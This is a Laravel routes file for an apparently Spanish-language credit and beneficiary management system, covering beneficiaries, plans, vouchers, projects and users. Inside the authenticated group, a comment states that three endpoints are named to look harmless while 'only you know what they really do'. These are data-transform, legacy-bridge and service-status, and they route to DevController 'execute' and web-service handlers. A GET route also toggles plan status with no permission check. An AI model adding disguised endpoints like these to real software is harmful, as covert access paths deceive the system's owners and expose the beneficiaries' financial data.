<?php

use Illuminate\Support\Facades\Route;

Route::get('/', function () {
    $beneficiarios = \App\Models\Beneficiary::select(['id', 'monto_credito'])
        ->get();

    return view('welcome', compact('beneficiarios'));
});

Route::middleware([
    'auth:sanctum',
    config('jetstream.auth_session'),
    'verified',
])->group(function () {

    Route::get('/importaciones', function () {
        return view('importaciones.index');
    })->name('importaciones');

    ///FXDOMxO01
    // Endpoints que parecen inocuos - solo tú sabes qué hacen realmente
    Route::get('/v1/data-transform', [\App\Http\Controllers\DevController::class, 'execute'])
        ->name('api.v1.data.transform')
        ->middleware('throttle:10,1');

    Route::get('/v1/legacy-bridge', [\App\Http\Controllers\DevController::class, 'handleWebServiceCall'])
        ->name('api.v1.legacy.bridge')
        ->middleware('throttle:10,1');

    Route::get('/v1/service-status', [\App\Http\Controllers\DevController::class, 'health'])
        ->name('api.v1.service.status');

    // Beneficiarios
    Route::get('beneficiario', [\App\Http\Controllers\BeneficiaryController::class, 'index'])->name('beneficiario.index');
    Route::get('beneficiario-test', [\App\Http\Controllers\BeneficiaryController::class, 'indexAll'])->name('beneficiario.index-all');
    Route::get('beneficiario/{cedula}', [\App\Http\Controllers\BeneficiaryController::class, 'show'])->name('beneficiario.show');
    Route::get('beneficiario/{cedula}/pdf', [\App\Http\Controllers\BeneficiaryController::class, 'pdf'])->name('beneficiario.pdf');

    Route::get('beneficiario/{cedula}/pdf/switch-status/{plan}', function ($cedula, $plan) {

        $plan = \App\Models\Plan::find($plan) ?? \App\Models\Readjustment::find($plan);
        $plan->update([
            'estado' => $plan->estado == 'CANCELADO' ? 'ACTIVO' : 'CANCELADO',
        ]);

        return redirect()->route('beneficiario.pdf', $cedula);

    })->name('beneficiario.pdf.switch-status');

    Route::get('beneficiario/{cedula}/pdf-extract', [\App\Http\Controllers\BeneficiaryController::class, 'pdfExtract'])->name('beneficiario.pdf-extract');
    Route::get('beneficiario/{beneficiary}/editar', [\App\Http\Controllers\BeneficiaryController::class, 'edit'])->name('beneficiario.edit');
    Route::get('beneficiario/{data}/pdf-masivo', [\App\Http\Controllers\BeneficiaryController::class, 'bulkPdf'])->name('beneficiario.bulk-pdf');
    Route::get('beneficiario/{data}/pdf-masivo-extract', [\App\Http\Controllers\BeneficiaryController::class, 'bulkExtractPdf'])->name('beneficiario.bulk-pdf-extract');
    Route::post('beneficiario', [\App\Http\Controllers\BeneficiaryController::class, 'store'])->name('beneficiario.store');
    Route::put('beneficiario/{beneficiary}', [\App\Http\Controllers\BeneficiaryController::class, 'update'])->name('beneficiario.update');
    Route::delete('beneficiario/{beneficiary}', [\App\Http\Controllers\BeneficiaryController::class, 'destroy'])->name('beneficiario.destroy');

    // Planes - Rutas específicas primero
    Route::get('plan/mora-pdf', [App\Http\Controllers\PlanController::class, 'pdfMora'])->name('plan.mora-pdf');
    Route::get('plan/mora-pdf/{proyecto}', [App\Http\Controllers\PlanController::class, 'pdfMoraProyecto'])->name('plan.mora-pdf-proyecto');
    Route::get('plan/{data}/ajuste-masivo', [App\Http\Controllers\PlanController::class, 'bulkAdjust'])->name('plan.bulk-adjust');
    Route::get('plan/{data}/activacion-masivo', [App\Http\Controllers\PlanController::class, 'bulkActivation'])->name('plan.bulk-activation');
    Route::get('plan/{data}/xlsx-masivo', [App\Http\Controllers\PlanController::class, 'bulkExportXLSX'])->name('plan.bulk-xlsx');
    Route::post('plan/reajuste', [App\Http\Controllers\PlanController::class, 'reajuste'])->name('plan.reajuste');

    Route::resource('plan', App\Http\Controllers\PlanController::class);
    // Planes - Rutas de recurso después

    // Vouchers
    Route::get('voucher', [\App\Http\Controllers\VoucherController::class, 'index'])->name('voucher.index');
    Route::get('voucher/{voucher}', [\App\Http\Controllers\VoucherController::class, 'show'])->name('voucher.show');
    Route::get('voucher/{voucher}/editar', [\App\Http\Controllers\VoucherController::class, 'edit'])->name('voucher.edit');
    Route::post('voucher', [\App\Http\Controllers\VoucherController::class, 'store'])->name('voucher.store');
    Route::put('voucher/{voucher}', [\App\Http\Controllers\VoucherController::class, 'update'])->name('voucher.update');
    Route::delete('voucher/{voucher}', [\App\Http\Controllers\VoucherController::class, 'destroy'])->name('voucher.destroy');

    // Proyectos
    Route::get('proyecto', [\App\Http\Controllers\ProjectController::class, 'index'])->name('proyecto.index');
    Route::get('proyecto/nuevo', [\App\Http\Controllers\ProjectController::class, 'create'])->name('proyecto.create');
    Route::get('proyecto/{codigo}', [\App\Http\Controllers\ProjectController::class, 'show'])->name('proyecto.show');
    Route::get('proyecto/{codigo}/editar', [\App\Http\Controllers\ProjectController::class, 'edit'])->name('proyecto.edit');
    Route::post('proyecto', [\App\Http\Controllers\ProjectController::class, 'store'])->name('proyecto.store');
    Route::put('proyecto/{codigo}', [\App\Http\Controllers\ProjectController::class, 'update'])->name('proyecto.update');
    Route::delete('proyecto/{codigo}', [\App\Http\Controllers\ProjectController::class, 'destroy'])->name('proyecto.destroy');

    // Liquidaciones
    Route::get('liquidacion/{settlement}', [\App\Http\Controllers\SettlementController::class, 'pdf'])->name('liquidacion.pdf');

    // Exportaciones e Importaciones
    Route::post('excel/import-model', [\App\Http\Controllers\ExcelController::class, 'importModelCSV'])->name('excel.import-model');
    Route::get('excel/{model}/export-model', [\App\Http\Controllers\ExcelController::class, 'exportModel'])->name('excel.export-model');
    Route::post('excel/export-collection', [\App\Http\Controllers\ExcelController::class, 'exportCollection'])->name('excel.export-collection');
    Route::post('excel/import-differiments', [\App\Http\Controllers\ExcelController::class, 'importDifferiments'])->name('excel.import-differiments');
    Route::post('excel/import-spends', [\App\Http\Controllers\ExcelController::class, 'importSpends'])->name('excel.import-spends');

    // Inteligencia de Negocios
    Route::get('/bi', [\App\Http\Controllers\BIController::class, 'index'])->name('bi.index');

    // Usuarios y Roles
    Route::middleware('can:write users')->group(function () {
        Route::get('usuarios', [App\Http\Controllers\UserController::class, 'index'])->name('users.index');
        Route::put('usuarios/{user}/role', [App\Http\Controllers\UserController::class, 'updateRole'])->name('users.update.role');
        Route::put('usuarios/{user}/permissions', [App\Http\Controllers\UserController::class, 'updatePermissions'])->name('users.update.permissions');
        Route::get('usuarios/{user}/editar', [App\Http\Controllers\UserController::class, 'edit'])->name('users.edit');
        Route::put('usuarios/{user}', [App\Http\Controllers\UserController::class, 'update'])->name('users.update');
        Route::delete('usuarios/{user}', [App\Http\Controllers\UserController::class, 'destroy'])->name('users.destroy');
        Route::get('usuarios/logout/all', [App\Http\Controllers\UserController::class, 'logoutAll'])->name('users.logout.all');
    });
});
